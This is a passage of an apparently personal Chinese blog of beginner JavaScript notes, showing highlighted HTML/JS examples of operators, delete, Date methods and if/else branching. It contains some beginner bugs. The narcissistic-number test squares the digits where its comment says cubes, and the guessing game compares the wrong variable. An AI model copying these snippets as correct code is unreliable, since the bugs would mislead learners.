class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="day5-运算符"><a href="#day5-运算符" class="headerlink" title="day5 运算符"></a>day5 运算符</h2><h3 id="自增，算术，比较，赋值"><a href="#自增，算术，比较，赋值" class="headerlink" title="自增，算术，比较，赋值"></a>自增，算术，比较，赋值</h3><h3 id="逻辑，条件运算符"><a href="#逻辑，条件运算符" class="headerlink" title="逻辑，条件运算符"></a>逻辑，条件运算符</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>jsday5运算符<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//复习</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//强制类型转换，非强制</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//强制类型转换/显示转换</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//字符串--&gt;数字 </span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//parseInt()保留整数部分 parseFloat()保留整数和小数部分 Number()非强制转换，如果遇到非数字返回NaN</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="built_in">isNaN</span>(<span class="number">123</span>));<span class="comment">//false</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="built_in">isNaN</span>(<span class="string">&quot;文字&quot;</span>));<span class="comment">//true</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="built_in">isNaN</span>(<span class="string">&quot;123&quot;</span>));<span class="comment">//false</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="built_in">isNaN</span>(<span class="string">&quot;12文字&quot;</span>));<span class="comment">//true</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//isNaN自带Number转换，先用Number转换再判断</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//数字--&gt;字符串</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//toString()不能转换null和undefined  String()可以转换null和undefined</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//Boolean()转成布尔值</span></span></span><br><span class="line">        </span><br><span class="line"><span class="javascript">        <span class="comment">//隐式转换</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//js语法不严谨，通过一些运算符可以用来改变数据类型</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//+ 如果两个值都是数字类型，+为加法，否则就是拼接作用</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//- * / %   两者有一个是字符串，运算后变为数值类型</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> x=<span class="number">123</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> y=<span class="string">&quot;121&quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="keyword">typeof</span>(x-y));<span class="comment">//Number</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//Math系列</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//min max abs ceil向上取整  floor向下取整 random</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"> <span class="comment">//----------------------------------------------------</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//运算符</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//算术运算符    自增、自减运算符    赋值    比较运算符  逻辑运算    条件运算</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//自增与C++一样，有前自增和后自增 条件运算符</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> x=<span class="number">10</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(x++); <span class="comment">//10</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(x); <span class="comment">//11</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(++x);   <span class="comment">//12</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//赋值运算符 =赋值 += -= *= /= 和C++一样，在原来数值的基础上进行运算再赋值x+=y等同于x=x+y 应用轮播图</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//比较运算符 == ===全等于 != !==不绝对等于    &gt;   &lt;   &gt;=  &lt;=  除了===和!==之外都与C++一样</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//===全等于需要考虑数据类型，==不考虑数据类型，!=与!==同理，后者也需要考虑类型</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="number">2</span>==<span class="string">&quot;2&quot;</span>);<span class="comment">//true</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="number">2</span>===<span class="string">&quot;2&quot;</span>);<span class="comment">//false,考虑类型</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="number">2</span>!=<span class="string">&quot;2&quot;</span>);<span class="comment">//false</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="number">2</span>!==<span class="string">&quot;2&quot;</span>);<span class="comment">//true，考虑类型</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//-----------------------------------------</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//逻辑运算符    &amp;&amp;与    ||或    !非 和C++一样用法</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> x=<span class="number">2</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> y=<span class="string">&quot;2&quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> z=<span class="number">3</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> p=<span class="string">&quot;3&quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log((x==y)&amp;&amp;(x!=y));<span class="comment">//false</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log((x==y)&amp;&amp;(x!=y));<span class="comment">//false</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(!(x==y));<span class="comment">//false</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//------------------------------------------------</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//条件运算符（三元运算符） ?:   和C++中一样</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//条件表达式?代码1:代码2，满足条件执行代码1，否则执行代码2</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> x=<span class="number">60</span>;</span></span><br><span class="line"><span class="javascript">        x&gt;=<span class="string">&quot;60&quot;</span>?<span class="built_in">console</span>.log(<span class="string">&quot;yes&quot;</span>):<span class="built_in">console</span>.log(<span class="string">&quot;no&quot;</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> n=prompt(<span class="string">&quot;你猜猜&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> index=<span class="built_in">parseInt</span>(<span class="built_in">Math</span>.random()*<span class="number">6</span>+<span class="number">1</span>);<span class="comment">//注意是*6+1</span></span></span><br><span class="line"><span class="javascript">        x==index?<span class="built_in">console</span>.log(<span class="string">&quot;yes&quot;</span>):<span class="built_in">console</span>.log(<span class="string">&quot;no&quot;</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="string">&quot;123&quot;</span>+<span class="string">&quot;&lt;br/&gt;&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="string">&quot;123换行&quot;</span>);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="day6-特殊运算符"><a href="#day6-特殊运算符" class="headerlink" title="day6 特殊运算符"></a>day6 特殊运算符</h2><h3 id="typeof-alert-delete"><a href="#typeof-alert-delete" class="headerlink" title="typeof,alert,delete"></a>typeof,alert,delete</h3><h3 id="new-时间相关用法"><a href="#new-时间相关用法" class="headerlink" title="new 时间相关用法"></a>new 时间相关用法</h3><h3 id="水仙花数与倒计时"><a href="#水仙花数与倒计时" class="headerlink" title="水仙花数与倒计时"></a>水仙花数与倒计时</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>day6特殊运算符<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;script src=&quot;./day6.js&quot;&gt;&lt;/script&gt; --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//特殊运算符</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//typeof 一元运算符 ，用法typeof(值)或typeof 值</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//.点运算符，用在对象上，找属性值</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//alert() 最普通的弹窗，完整写法 window.alert,这里的.使用方法或者属性。使用js来控制html标签样式也用到点.</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//[]数组，内部为下标</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//delete运算符，用来删除数组的值，或对象的属性</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> arr=[<span class="string">&quot;键盘&quot;</span>,<span class="string">&quot;主机&quot;</span>,<span class="string">&quot;鼠标&quot;</span>,<span class="string">&quot;显示屏&quot;</span>];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">delete</span> arr[<span class="number">2</span>];</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(arr[<span class="number">2</span>]);<span class="comment">//undefined</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(arr.length);<span class="comment">//4</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//通过delete删除数组的值，数组长度不变，原本值所在的位置变成empty</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> obj=&#123;</span></span><br><span class="line"><span class="javascript">            <span class="string">&quot;name&quot;</span>:<span class="string">&quot;www&quot;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="string">&quot;age&quot;</span>:<span class="number">20</span></span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="keyword">delete</span> obj[<span class="string">&quot;name&quot;</span>];</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(obj);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//new 运算符</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//时间 </span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> x=<span class="keyword">new</span> <span class="built_in">Date</span>();<span class="comment">//获取本地时间</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// document.write(x+&quot;&lt;br&gt;&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// document.write(x.toLocaleString()+&quot;&lt;br&gt;&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// document.write(x.toLocaleDateString());</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(x.getFullYear());</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(x.getMonth()+<span class="number">1</span>);<span class="comment">//默认会比实际月份小1</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(x.getDate());<span class="comment">//获取日</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(x.getHours());</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(x.getMinutes());</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(x.getSeconds());</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(x.getDay());<span class="comment">//0周日</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//例1：水仙花数：三位数，每位的立方之和=本身</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> x=prompt(<span class="string">&quot;input a number&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> bai=<span class="built_in">parseInt</span>(x/<span class="number">100</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> shi=<span class="built_in">parseInt</span>(x/<span class="number">10</span>)%<span class="number">10</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ge= <span class="built_in">parseInt</span>(x%<span class="number">10</span>);</span></span><br><span class="line"><span class="javascript">        ge*ge+shi*shi+bai*bai==x?<span class="built_in">console</span>.log(<span class="string">&quot;水仙花数&quot;</span>):<span class="built_in">console</span>.log(<span class="string">&quot;不是水仙花数&quot;</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//例2：距离世界毁灭时间还有多少时间</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> time_begin=<span class="keyword">new</span> <span class="built_in">Date</span>();</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> time_end=<span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">&quot;2222/2/22 22:22&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> time_between=time_end-time_begin;<span class="comment">//默认毫秒</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> day=<span class="built_in">parseInt</span>(time_between/<span class="number">1000</span>/<span class="number">60</span>/<span class="number">60</span>/<span class="number">24</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> hour=<span class="built_in">parseInt</span>(time_between/<span class="number">1000</span>/<span class="number">60</span>/<span class="number">60</span>%<span class="number">24</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> min=<span class="built_in">parseInt</span>(time_between/<span class="number">1000</span>/<span class="number">60</span>%<span class="number">60</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> sec=<span class="built_in">parseInt</span>(time_between/<span class="number">1000</span>%<span class="number">60</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="string">&quot;距离世界末日还有&quot;</span>+day+<span class="string">&quot;天&quot;</span>+hour+<span class="string">&quot;小时&quot;</span>+min+<span class="string">&quot;分&quot;</span>+sec+<span class="string">&quot;秒&quot;</span>);</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="day7-前期总结"><a href="#day7-前期总结" class="headerlink" title="day7  前期总结"></a>day7  前期总结</h2><h2 id="day8-分支控制"><a href="#day8-分支控制" class="headerlink" title="day8 分支控制"></a>day8 分支控制</h2><h3 id="if，else"><a href="#if，else" class="headerlink" title="if，else"></a>if，else</h3><h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>day8 js顺序控制<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// //顺序控制，和C++一样</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// //分支控制，if和switch</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// //if 单路分支（无else）,双路分支，多路分支</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var x=10;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var y=&quot;10&quot;;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// if(x==y)&#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     console.log(&quot;yes&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// if(x===y)&#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     console.log(&quot;no&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// //单路分支</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">// var txt=prompt(&quot;input your name&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// if(txt=&quot;橙子&quot;)</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     document.write(&quot;你真是个好橙子&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// else</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     document.write(&quot;you are bad&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">// var  txt=prompt(&quot;input your age&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// if((txt &gt;= 0) &amp;&amp; (txt &lt;= 6)) &#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     console.log(&quot;幼儿园&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125; else if (txt &gt;= 7 &amp;&amp; txt &lt;= 12) &#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     console.log(&quot;小学&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125; else if (txt &gt;= 13 &amp;&amp; txt &lt;= 15) &#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     console.log(&quot;中学&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125; else if (txt &gt;= 16 &amp;&amp; txt &lt;= 18) &#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     console.log(&quot;高中&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125; else if (txt &gt;= 19 &amp;&amp; txt &lt;= 22) &#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     console.log(&quot;大学&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125; else if (txt &gt;= 23 &amp;&amp; txt &lt;= 60) &#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     console.log(&quot;工作&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125; else&#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     console.log(&quot;退休&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//嵌套分支，if语句的嵌套</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//判断当前输入的东西是否为数字类型的两种方法：isNaN(值)==false, typeof 值==&quot;number&quot;不靠谱</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">// var x=prompt(&quot;多大了&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(typeof (Number(x)));//prompt返回的都是string类型，所以if条件恒false，考虑使用Number转换，但是会造成“123wenzi”也会转换为数值类型，虽然输出的只是123，所以不靠谱，故使用isNaN作为条件</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// if(typeof(x)==&quot;number&quot;)</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     console.log(&quot;数字&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125;else&#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     console.log(&quot;非数字&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">// if(!(isNaN(x)))&#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     // console.log(&quot;数字&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     if(x&gt;=0&amp;&amp;x&lt;=17)&#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//         alert(&quot;未成年&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     &#125;else if(x&gt;=18&amp;&amp;x&lt;=30)&#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//         alert(&quot;成年&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     &#125; else if (x &gt;= 31 &amp;&amp; x &lt;= 50) &#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//         alert(&quot;中年&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     &#125; else&#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//         alert(&quot;老年&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     &#125;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125;else&#123;</span></span></span><br><span class="line"><span class="javascript">        <span 